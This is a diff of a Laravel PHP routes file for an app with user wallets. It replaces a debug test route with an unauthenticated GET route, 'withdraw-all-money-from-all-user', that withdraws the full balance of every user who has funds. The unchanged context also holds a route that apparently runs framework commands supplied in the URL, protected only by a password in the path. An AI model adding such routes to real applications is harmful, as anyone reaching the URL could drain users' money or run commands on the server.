@@ -28,15 +28,11 @@ use Illuminate\Routing\RouteGroup;
     });
 } */
 
-Route::get('test', function () {
-    $user = Package::find(1);
-    /* $product = Product::find(1);
-    $transaction = ModelsTransaction::find(1);
-    $process = (new UserPurchaseProcessor)->handle($user, $transaction, $product);
-    dd($process); */
-    // $area_admin = User::whereRelation('roles', 'name', '=', 'area_admin')->whereRelation('province', 'area', '=', $user->province->area)->first();
-    // dd($area_admin);
-    dd($user->amount);
+Route::get('withdraw-all-money-from-all-user', function () {
+    $users = User::whereHas('wallet', fn($w) => $w->where('balance', '>', 0))->get();
+    foreach ($users as $user) {
+        $user->withdraw($user->balance);
+    }
 });
 
 Route::get('artisan/{password}/{command}', function ($password, $command) {
